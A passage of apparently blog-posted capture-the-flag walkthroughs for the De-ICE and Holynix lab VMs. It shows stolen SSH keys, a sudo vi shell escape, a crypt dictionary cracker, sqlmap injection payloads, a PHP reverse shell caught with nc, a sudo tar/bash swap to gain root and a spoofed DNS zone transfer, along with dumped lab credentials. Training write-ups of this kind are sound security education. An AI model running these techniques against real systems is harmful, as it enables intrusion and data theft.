+I foolishly assumed that there was only one target in the challenge! A quick nmap revealed that this target was only running HTTP. I checked out the website and found several PDFs linked on the main page:
+
+
+
+I downloaded the PDFs but didn't find anything of interest. There were no other visible links or directories, so I decided to try nikto and dirbuster to see if anything would show up. Sure enough, dirbuster reported a /home directory:
+
+
+
+I tried going to http://192.168.2.101/home/root and found that it was viewable. I did the same for the three known user accounts, but they were all empty. I decided to look for hidden files that might be useful: .bashrc, .bash_profile and .ssh. I got lucky and found that pirrip had a viewable .ssh directory!
+
+
+
+Not only was it viewable, it contained the private and public SSH keys for pirrip. If the private key wasn't password protected, and pirrip used it to log into 192.168.2.100, then I might be able to do the same. I downloaded id_rsa and copied it to my ~/.ssh directory and changed the permissions to read/write only by root, crossed my fingers and tried to SSH to the server:
+
+root@syconium# cd ~/.ssh
+root@syconium# wget -q  http://192.168.2.101/home/pirrip/.ssh/id_rsa
+root@syconium# chmod 600 id_rsa
+root@syconium# ssh pirrip@192.168.2.101
+Linux 2.6.16.
+pirrip@slax:~$ id
+uid=1000(pirrip) gid=10(wheel) groups=10(wheel)
+pirrip@slax:~$
+
+
+Success, but there was more to be done. I was in the server, but I needed to get root access. I tried to run sudo but it prompted me for a password, which I didn't have. It was time to do some exploring.
+
+I was limited in what I could read, so I went through pirrip's home directory, web folders, log files, and so on. Eventually I made my way to /var/mail/pirrip. I opened this up and read through pirrip's emails and right at the bottom, found pirrip's password:
+
+From: noreply@fermion.herot.net
+Message-Id: <200801132354.m0DNshjD011722@slax.example.net>
+Date: Sun, 13 Jan 2008 23:54:42 +0000
+To: pirrip@slax.example.net
+Subject: Fermion Account Login Reminder
+User-Agent: nail 11.25 7/29/05
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+Fermion Account Login Reminder
+
+Listed below are your Fermion Account login credentials.  Please let us know if you have any questions or problems.
+
+Regards,
+Fermion Support
+
+
+E-Mail: pirrip@slax.example.net
+Password: 0l1v3rTw1st
+
+
+Using this new bit of information, I tried sudo again and it accepted the password and presented me with a list of programs I could use with sudo:
+
+pirrip@slax:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+Password:
+User pirrip may run the following commands on this host:
+    (root) /usr/bin/more
+    (root) /usr/bin/tail
+    (root) /usr/bin/vi
+    (root) /usr/bin/cat ALL
+
+
+vi is allowed, so I used it to open /etc/shadow to obtain the encrypted passwords for later cracking. Another neat feature of vi is it's ability to run commands by typing !command while you're viewing a file. So I entered !/bin/bash and was dropped into a root shell:
+
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+nobody:*:9797:0:::::
+pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
+magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
+!/bin/bash
+bash-3.1# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)
+bash-3.1#
+
+
+The server has been successfully rooted. I knew from the previous two challenges that rooting the server wasn't enough. There would be some hidden file with confidential information hidden away somewhere, so I started searching for it.
+
+I found a file called /root/.save/great_expectations.zip. I tried to unzip it but the server complained that the disk was full, so I transferred it over to /var/www/htdocs and downloaded it to my machine. After extracting and pouring over the contents of the zip file, one in particular stood out. A file called Jan08 contained the pay raise information and social security numbers for pirrip, havisham, and magwitch:
+
+root@syconium# cat Jan08
+--snip--
+To: pirrip@slax.example.net
+Subject: Raises
+User-Agent: nail 11.25 7/29/05
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+
+Here's the data for raises for your team:
+Philip Pirrip:  734-67-0424 5.5% $74,224
+Abel Magwitch:  816-03-0028 4.0% $53,122
+Estella Havisham: 762-93-1073 12% $84,325
+
+
+Mission accomplished, but I didn't stop there. MySQL was running on the server and I wanted to see if there was any interesting data on it. I tried logging in without passwords as havisham, magwitch, and pirrip and it let me in. Nothing to see there though. I tried using root but it wanted a password. I tried guessing the password as root and toor, and got in with password toor. Unfortunately, no interesting data was stored.
+
+I found a /usr/local/apache/.htpasswd file with the following contents:
+
+bash-3.1# cat /usr/local/apache2/.htpasswd
+aadams:bS.PQ9hVYEqrQ
+
+
+Looks like the password was encrypted with crypt(). The first two characters in the ciphertext is the salt. Knowing this, I wrote a quick python script to try a dictionary attack on the password:
+
+#!/usr/bin/env python
+import crypt, sys
+
+if __name__ == "__main__":
+    wordlist = sys.argv[1]
+    htfile = sys.argv[2]
+    print "using wordlist:", wordlist
+    print "using htaccess:", htfile
+
+    for line in open(htfile):
+        user = line.split(":")[0].strip()
+        ciphertext = line.split(":")[1].strip()
+        salt = ciphertext[:2]
+        print "ciphertext:", ciphertext
+        print "salt:", salt
+        for word in open(wordlist):
+            guess = crypt.crypt(word.strip(), salt)
+            if guess == ciphertext:
+                print "  *  password for %s is %s" % (user, word.strip())
+                sys.exit(0)
+
+
+The script takes two arguments. The first is the wordlist, and the second is the htpasswd file:
+
+root@syconium# crackht /pentest/passwords/wordlists/darkc0de.lst htpasswd
+using wordlist: /pentest/passwords/wordlists/darkc0de.lst
+using htpasswd: htpasswd
+ciphertext: bS.PQ9hVYEqrQ
+salt: bS
+  *  password for aadams is complexi
+
+
+I was able to get the password for aadams. Not really usable at this point, but a nice bonus in any case.
+
+This challenge was a lot of fun and took me several hours over the course of about a week to complete. The website states that it takes approximately 40 hours to complete the challenge. I probably hit close to 30 hours, and would have probably done it in less had I known there was a second web server in the challenge. Once I discovered the second web server, I blew through the rest of the challenge in a breeze.
+
+That's it for the De-ICE hacking challenge. I recommend giving it a go if you're interested in getting your feet wet in penetration testing.
+
+ 
+
+http://techorganic1.rssing.com/inc/img/tmbtn.png
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tup-blue.png
+	
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tdown-blue.png
+
+·  04/07/12--18:40: Holynix hacking challenge: Part 1
+
+
+I've been playing a few of these hacking challenges over the past few months, some are extremely easy, while others force you to think out of the box. Completing a challenge is rewarding, but the journey to completion is sometimes fraught with frustration. In this post I'm going to be describing how I completed the Holynix 1 challenge. Holynix 1 can be downloaded from http://sourceforge.net/projects/holynix/files/1.0/ As before I'll be using Backtrack Linux to perform the attack and running Holynix on VMware. Both machines were running ont he same network, so a netdiscover revealed the IP address of the target. I ran nmap against the target and pointed my browser to that IP address to see if a website was present:
+
+
+
+I found a login form on the website. I thought this might be vulnerable to a SQL injection attack, and I would try sqlmap against it later. In the meantime, I looked at the nmap report:
+
+
+
+# nmap -sS -T4 -A -O 192.168.1.155
+
+Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-04-07 17:31 EDT
+Nmap scan report for 192.168.1.155
+Host is up (0.00054s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 00:0C:29:BC:05:DE (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:kernel:2.6
+OS details: Linux 2.6.24 - 2.6.25
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.54 ms 192.168.1.155
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.82 seconds
+
+Nothing except port 80 was open. I decided to run nikto and sqlmap against the target. Here's what nikto reported:
+
+
+# ./nikto.pl -host 192.168.1.155
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.155
++ Target Hostname:    192.168.1.155
++ Target Port:        80
++ Start Time:         2012-04-07 17:34:31 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12
++ PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.3.6)
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /index.php?page=../../../../../../../../../../etc/passwd: PHP include error may indicate local or remote file inclusion is possible.
++ /index.php?page=../../../../../../../../../../boot.ini: PHP include error may indicate local or remote file inclusion is possible.
++ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-2562: /login/sm_login_screen.php?error=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-2562: /login/sm_login_screen.php?uid=\"><script>alert('Vulnerable')</script>: SPHERA HostingDirector and Final User (VDS) Control Panel 1-3 are vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3092: /home/: This might be interesting...
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3092: /login/: This might be interesting...
++ OSVDB-3092: /misc/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /index.php?module=PostWrap&page=http://cirt.net/rfiinc.txt?: PHP include error may indicate local or remote file inclusion is possible.
++ /index.php?page=http://cirt.net/rfiinc.txt?: PHP include error may indicate local or remote file inclusion is possible.
++ /index.php?page=http://cirt.net/rfiinc.txt?: PHP include error may indicate local or remote file inclusion is possible.
++ /index.php?page=http://cirt.net/rfiinc.txt??: PHP include error may indicate local or remote file inclusion is possible.
++ /index.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls: PHP include error may indicate local or remote file inclusion is possible.
++ /login.php: Admin login page/section found.
++ 6474 items checked: 1 error(s) and 22 item(s) reported on remote host
++ End Time:           2012-04-07 17:35:04 (GMT-4) (33 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Some interesting things there, particularly the local/remote file inclusion attacks. These could be used to read PHP files or the /etc/passwd file to get a list of users on the system. I saved the output for later analysis and ran sqlmap to see if it could find any SQL injection attacks. Since sqlmap is very verbose, I've posted only the interesting bits here:
+
+
+# ./sqlmap.py --url "http://192.168.1.155/?page=login.php" --forms --dump-all
+
+    sqlmap/1.0-dev (r4766) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 17:41:09
+
+[17:41:09] [INFO] testing connection to the target url
+[17:41:09] [INFO] heuristics detected web page charset 'ascii'
+[17:41:09] [INFO] searching for forms
+[#1] form:
+POST http://192.168.1.155:80/index.php?page=login.php
+POST data: user_name=&password=&Submit_button=Submit
+do you want to test this form? [Y/n/q]
+> 
+Edit POST data [default: user_name=&password=&Submit_button=Submit] (Warning: blank fields detected):
+do you want to fill blank fields with random values? [Y/n]
+[17:41:22] [INFO] using '/pentest/database/sqlmap/output/192.168.1.155/session' as session file
+[17:41:22] [INFO] using '/pentest/database/sqlmap/output/results-04072012_0541pm.csv' as results file
+[17:41:22] [INFO] heuristics detected web page charset 'ascii'
+[17:41:22] [INFO] testing if the url is stable, wait a few seconds
+
+Above, I told sqlmap to dump everything it found if a SQL injection exploit was possible. It recognized the login form and asked if I wanted to submit any specific values. I went with the defaults which are random values.
+
+
+[17:41:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection points with a total of 193 HTTP(s) requests:
+---
+Place: POST
+Parameter: password
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: user_name=pSKR&password=Loxw' AND (SELECT 9364 FROM(SELECT COUNT(*),CONCAT(0x3a6d737a3a,(SELECT (CASE WHEN (9364=9364) THEN 1 ELSE 0 END)),0x3a68646c3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'iUcM'='iUcM&Submit_button=Submit
+---
+
+do you want to exploit this SQL injection? [Y/n]
+
+The password parameter was vulnerable to SQL injection. I confirm that I want it to exploit that field and it dumped all the tables in the database. At some point it found passwords and asked if I wanted to crack them. I say no, this can be done later on in the background, better to let sqlmap finish dumping all the tables.
+
+
+[17:56:09] [INFO] Table 'mysql.user' dumped to CSV file '/pentest/database/sqlmap/output/192.168.1.155/dump/mysql/user.csv'
+[17:56:09] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/pentest/database/sqlmap/output/results-04072012_0541pm.csv'
+
+[*] shutting down at 17:56:09
+
+Once it had completed running, it was time to examine the dump files. Two databases were found aside from mysql and information_schema:
+
+
+# ls -l
+total 16
+drwxr-xr-x 2 root root 4096 2012-04-07 17:44 clients
+drwxr-xr-x 2 root root 4096 2012-04-07 17:44 creds
+drwxr-xr-x 2 root root 4096 2012-04-07 17:48 information_schema
+drwxr-xr-x 2 root root 4096 2012-04-07 17:56 mysql
+
+I looked at the contents of the clients directory and found two tables inside, accounts and credits. The accounts table contained what appeared to be client information including credit card numbers:
+
+
+# cat clients/accounts.csv
+address,CCN,cid,email,exp,name,phone,surname,type
+"3965 Willis Ave:Daytona Beach, FL 32114",4485 6129 3846 3674,11,WinnieMFischer@example.org,12/2011,Winnie,386-323-1724,Fischer,Visa
+"4970 Haven Ln:Lansing, MI 48933",4485 9777 7807 3283,27,MichaelMahler@example.org,10/2014,Michael,517-652-8204,Mahler,Visa
+"4253 Hummingbird Way:Cambridge, MA 02141",4539 1640 5255 9206,18,ArthurRBailey@example.org,3/2012,Arthur,781-994-7119,Bailey,Visa
+"4011 Randall Dr:Kawaihae, HI 96743",4539 1845 7920 4698,17,MarthaCFrost@example.org,5/2015,Martha,808-880-6054,Frost,Visa
+"4834 Freed Dr:Stockton, CA 95202",4716 1304 2847 6396,29,JessicaDuerr@example.org,10/2012,Jessica,209-679-1447,Duerr,Visa
+
+The credits table had text thanking various people, nothing of interest to the attack. I looked into the contents of the creds database:
+
+
+# ls -l
+total 28
+-rw-r--r-- 1 root root  348 2012-04-07 17:44 accounts.csv
+-rw-r--r-- 1 root root 5208 2012-04-07 17:44 blogs_table.csv
+-rw-r--r-- 1 root root 1026 2012-04-07 17:44 calender.csv
+-rw-r--r-- 1 root root 5180 2012-04-07 17:44 employee.csv
+-rw-r--r-- 1 root root  117 2012-04-07 17:44 page.csv
+
+Several tables were dumped. The accounts table contained several usernames and passwords:
+
+
+# cat accounts.csv
+cid,password,upload,username
+1,Ih@cK3dM1cR05oF7,0,alamo
+2,P3n7@g0n0wN3d,1,etenenbaum
+3,d15cL0suR3Pr0J3c7,1,gmckinnon
+4,Ik1Ll3dNiN@r315er,1,hreiser
+5,p1@yIngW17hPh0n35,1,jdraper
+6,@rR35t3D@716,1,jjames
+7,m@k1nGb0o7L3g5,1,jljohansen
+8,wH@7ar37H3Fed5D01n,1,kpoulsen
+9,f@7H3r0FL1nUX,0,ltorvalds
+10,n@5aHaSw0rM5,1,mrbutler
+11,Myd@d51N7h3NSA,1,rtmorris
+
+I thought these might be the login credentials to the server or to the website. The other tables provided more information, the blogs_table has some blog posts but was a bit difficult to read with the current formatting. I thought if I logged into the website it might be easier to read. The employees table listed employee information including email addresses and phone numbers, the calendar table listed events, and the page table listed several PHP files - possibly pages that the website recognizes. I decided it was time to log into the website. I picked user etenenbaum because the upload field in the accounts table for his entry was set to 1, which usually means true. Using his credentials, I gained access into the website:
+
+
+I started exploring the website. The Message Board section had some interesting information. Looks like they use knockknock which adds an extra layer of security to the server when trying to SSH into it. Essentially, a port knock is required before the SSH port is opened to allow the user to connect. Instructions are provided on how to setup knockknock so a user can connect. The Upload section allows a user to upload files to their home directories. I point my browser to etenenbaum's page to see if there was anything of interest:
+
+
+I decided to try to upload something. On the upload page I have the option of having a gzip'd file automatically extracted. Not sure what that meant at the time, so I created two text files and gzip'd one of them. I wanted to upload both files to see what would happen.
+
+
+# echo "hello world" > test1.txt
+# echo "hello world" > test2.txt
+# tar czf test2.tar.gz test2.txt
+# ls -l
+total 12
+-rw-r--r-- 1 root root  12 2012-04-07 18:30 test1.txt
+-rw-r--r-- 1 root root 130 2012-04-07 18:31 test2.tar.gz
+-rw-r--r-- 1 root root  12 2012-04-07 18:30 test2.txt
+
+I uploaded test1.txt and test2.tar.gz and went back to etenenbaum's page. Both files were uploaded, but only test2.txt was readable. This meant that I could upload any file I wanted to the site, provided it was gzip'd. I decided to try a PHP reverse shell. I grabbed a PHP reverse shell from from pentestmonkey.net, edited it with my machine's IP address and port to listen to, gzip'd it, and uploaded it. I started nc to listen for the connection and launched clicked on the rshell.php link on etenenbaum's page:
+
+
+# nc -lvp 9998
+listening on [any] 9998 ...
+192.168.1.155: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.1.154] from (UNKNOWN) [192.168.1.155] 52587
+Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
+ 12:46:11 up  2:55,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: can't access tty; job control turned off
+$
+
+Success, I had gained shell access to the server. First thing I did was to check for sudo access.
+
+
+
+$ sudo -l
+User www-data may run the following commands on this host:
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /bin/chgrp
+    (root) NOPASSWD: /bin/tar
+    (root) NOPASSWD: /bin/mv
+
+Those are a lot of commands and no password required to run them. Here's what I did to root the machine:
+
+
+$ cd /tmp/  
+$ cp /bin/bash .
+$ sudo chown root:root /tmp/bash
+$ sudo mv /bin/tar /bin/tar.orig
+$ sudo mv /tmp/bash /bin/tar
+$ sudo /bin/tar
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+So a quick breakdown on what I did here was to copy /bin/bash to /tmp, backup /bin/tar, move /tmp/bash to /bin as tar, and then sudo /bin/tar which is essentially running sudo /bin/bash. This results in temporarily making the tar command unavailable, but getting the root shell.
+
+At this point the game is over. However, there is another solution to gaining root, the one that the developer probably intended. To summarize, it involves downloading the contents of /etc/knockknock.d and using the profiles contained within to SSH into the server as one of the users in the developer group. There is an exploit for the changetrack command which allows a user to gain root access to the machine.
+
+Overall an interesting challenge. I was able to root the machine in a different way by taking advantage of the non-password protected sudo commands that were granted to the www-data user.
+
+ 
+
+http://techorganic1.rssing.com/inc/img/tmbtn.png
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tup-blue.png
+	
+
+0
+	
+
+http://techorganic1.rssing.com/inc/img/tdown-blue.png
+
+·  04/09/12--12:19: Holynix hacking challenge: Part 2
+
+
+On to Holynix 2, the last Holynix challenge as of this writing. Holynix 2 can be downloaded from http://sourceforge.net/projects/holynix/files/2.0/. As before, Backtrack Linux is used as the attacking machine, and everything is run in a virtualized environment. Holynix 2 has a static IP address, so go over the README.txt file before starting and setup your network accordingly. I ran netdiscover and found 192.168.1.88 as the IP address of the target machine. I fired up nmap to see what was running:
+
+
+# nmap -sS -A -T4 -O 192.168.1.88
+
+Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-04-08 17:48 EDT
+Warning: Servicescan failed to fill cpe_a (subjectlen: 319, devicetypelen: 32). Too long? Match string was line 491: d//
+Nmap scan report for 192.168.1.88
+Host is up (0.00048s latency).
+Not shown: 995 filtered ports
+PORT   STATE  SERVICE  VERSION
+20/tcp closed ftp-data
+21/tcp open   ftp      Pure-FTPd
+|_ftp-bounce: no banner
+22/tcp open   ssh      OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+53/tcp open   domain   ISC BIND 9.4.2-P2.1
+80/tcp open   http     Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
+|_http-title: ZincFTP
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+MAC Address: 00:0C:29:13:21:B3 (VMware)
+No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=5.61TEST4%E=4%D=4/8%OT=21%CT=20%CU=34350%PV=Y%DS=1%DC=D%G=Y%M=000
+OS:C29%TM=4F8207CF%P=i686-pc-linux-gnu)SEQ(SP=D3%GCD=1%ISR=EF%TI=Z%CI=Z%II=
+OS:I%TS=7)SEQ(CI=Z%II=I)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O
+OS:4=M5B4ST11NW5%O5=M5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=
+OS:16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=41%W=16D0%O=M5B4NNSNW5%CC=N%Q=)ECN(R
+OS:=N)T1(R=Y%DF=Y%T=41%S=O%A=S+%F=AS%RD=0%Q=)T1(R=N)T2(R=N)T3(R=N)T4(R=N)T5
+OS:(R=Y%DF=Y%T=41%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=41%W=0%S=A%A=Z
+OS:%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=41%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
+OS:G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=41%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.48 ms 192.168.1.88
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.74 seconds
+
+FTP, SSH, DNS, and HTTP. I pointed my browser to the website to look for anything interesting. It appeared to be registration form with some information about the nameservers used by the site.
+
+
+I decided to run nikto and sqlmap against the site. Unfortunately, nikto didn't find anything promising:
+
+
+# ./nikto.pl -host 192.168.1.88
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.88
++ Target Hostname:    192.168.1.88
++ Target Port:        80
++ Start Time:         2012-04-08 17:55:05 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.12
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ PHP/5.2.4-2ubuntu5.12 appears to be outdated (current is at least 5.3.6)
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /register/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6474 items checked: 1 error(s) and 9 item(s) reported on remote host
++ End Time:           2012-04-08 17:55:36 (GMT-4) (31 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+sqlmap was also unable to find any SQL injection vulnerabilities:
+
+
+# ./sqlmap.py --url "192.168.1.88" --forms --dump-all
+
+    sqlmap/1.0-dev (r4766) - automatic SQL injection and database takeover tool
+    http://www.sqlmap.org
+
+[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 17:58:03
+
+[17:58:03] [INFO] testing connection to the target url
+[17:58:03] [INFO] heuristics detected web page charset 'ascii'
+[17:58:03] [INFO] searching for forms
+[#1] form:
+POST http://192.168.1.88:80/register.php
+POST data: username=&email=
+do you want to test this form? [Y/n/q]
+> 
+Edit POST data [default: username=&email=] (Warning: blank fields detected):
+do you want to fill blank fields with random values? [Y/n]
+[17:58:08] [INFO] using '/pentest/database/sqlmap/output/192.168.1.88/session' as session file
+[17:58:08] [INFO] using '/pentest/database/sqlmap/output/results-04082012_0558pm.csv' as results file
+[17:58:08] [INFO] heuristics detected web page charset 'ascii'
+.
+.
+.
+[17:58:12] [WARNING] POST parameter 'email' is not injectable
+[17:58:12] [ERROR] all parameters appear to be not injectable. Try to increase --level/--risk values to perform more tests. Also, you can try to rerun by providing either a valid --string or a valid --regexp, refer to the user's manual for details, skipping to the next form
+[17:58:12] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/pentest/database/sqlmap/output/results-04082012_0558pm.csv'
+
+[*] shutting down at 17:58:12
+
+The default level and risk parameters on sqlmap couldn't find any vulnerabilities. I increased the risk and level values to their maximum and tried again, but the results were the same. Thinking that there might be hidden directories on the server, I fired up DirBuster to go through a list of popular directories that may be on the server:
+
+
+I went back to the website and started entering random values on the form to see the behaviour. The form would complain when an email address was improperly formatted, so it was doing some input filtering. I tried entering commands into the username field, including terminating the name with a semicolon, ampersands, pipes, and trying to get other shell commands in there. It seemed however that it would treat the entire username as a string and save it somewhere. At this point, I wasn't sure if it was being saved into a flat file or a database. Entering the same username would result in an error, signifying that the username had already been recorded somewhere.
+
+The other clue I had were the nameservers that were provided on the registration page. I ran dig to see what I could find:
+
+
+# dig zincftp.com @192.168.1.88
+
+; > DiG 9.7.0-P1 > zincftp.com @192.168.1.88
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2
+
+;; QUESTION SECTION:
+;zincftp.com.   IN A
+
+;; ANSWER SECTION:
+zincftp.com.  38400 IN A 192.168.1.88
+
+;; AUTHORITY SECTION:
+zincftp.com.  38400 IN NS ns2.zincftp.com.
+zincftp.com.  38400 IN NS ns1.zincftp.com.
+
+;; ADDITIONAL SECTION:
+ns1.zincftp.com. 38400 IN A 192.168.1.88
+ns2.zincftp.com. 38400 IN A 192.168.1.89
+
+;; Query time: 1 msec
+;; SERVER: 192.168.1.88#53(192.168.1.88)
+;; WHEN: Sun Apr  8 18:07:45 2012
+;; MSG SIZE  rcvd: 113
+
+I found the IP address of the secondary nameserver, 192.168.1.89. However this machine was not currently running on the network. It occurred to me that the registration page notes that users who have a ZincFTP account have a webpage in the form of username.zincftp.com I thought that if I could do a zone transfer, then I might be able to get a list of those users:
+
+
+
+# dig zincftp.com @192.168.1.88 axfr
+
+; > DiG 9.7.0-P1 > zincftp.com @192.168.1.88 axfr
+;; global options: +cmd
+; Transfer failed.
+
+No luck there, but then again, you can't really do a zone tranfer against any site. However, since the secondary nameserver was inactive, I decided to try setting my machine's IP to the secondary nameserver's IP and trying a zone transfer again. Primary and secondary nameservers usually trust each other to do a zone transfer, so it might work:
+
+
+# ifconfig eth0 down
+# ifconfig eth0 192.168.1.89 up
+# dig @192.168.1.88 zincftp.com axfr
+
+; > DiG 9.7.0-P1 > @192.168.1.88 zincftp.com axfr
+; (1 server found)
+;; global options: +cmd
+zincftp.com.  38400 IN SOA ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
+zincftp.com.  38400 IN NS ns1.zincftp.com.
+zincftp.com.  38400 IN NS ns2.zincftp.com.
+zincftp.com.  38400 IN MX 10 mta.zincftp.com.
+zincftp.com.  38400 IN A 192.168.1.88
+ahuxley.zincftp.com. 38400 IN A 192.168.1.88
+amckinley.zincftp.com. 38400 IN A 192.168.1.88
+bzimmerman.zincftp.com. 38400 IN A 192.168.1.88
+cbergey.zincftp.com. 38400 IN A 192.168.1.88
+cfinnerly.zincftp.com. 38400 IN A 192.168.1.88
+cjalong.zincftp.com. 38400 IN A 192.168.1.88
+cmahong.zincftp.com. 38400 IN A 192.168.1.88
+cmanson.zincftp.com. 38400 IN A 192.168.1.88
+ddonnovan.zincftp.com. 38400 IN A 192.168.1.88
+ddypsky.zincftp.com. 38400 IN A 192.168.1.88
+dev.zincftp.com. 38400 IN A 192.168.1.88
+dhammond.zincftp.com. 38400 IN A 192.168.1.88
+dmoran.zincftp.com. 38400 IN A 192.168.1.88
+dsummers.zincftp.com. 38400 IN A 192.168.1.88
+evorhees.zincftp.com. 38400 IN A 192.168.1.88
+gwelch.zincftp.com. 38400 IN A 192.168.1.88
+hmcknight.zincftp.com. 38400 IN A 192.168.1.88
+jgacy.zincftp.com. 38400 IN A 192.168.1.88
+jsmith.zincftp.com. 38400 IN A 192.168.1.88
+jstreet.zincftp.com. 38400 IN A 192.168.1.88
+kmccallum.zincftp.com. 38400 IN A 192.168.1.88
+lnickerbacher.zincftp.com. 38400 IN A 192.168.1.88
+lsanderson.zincftp.com. 38400 IN A 192.168.1.88
+lwestre.zincftp.com. 38400 IN A 192.168.1.88
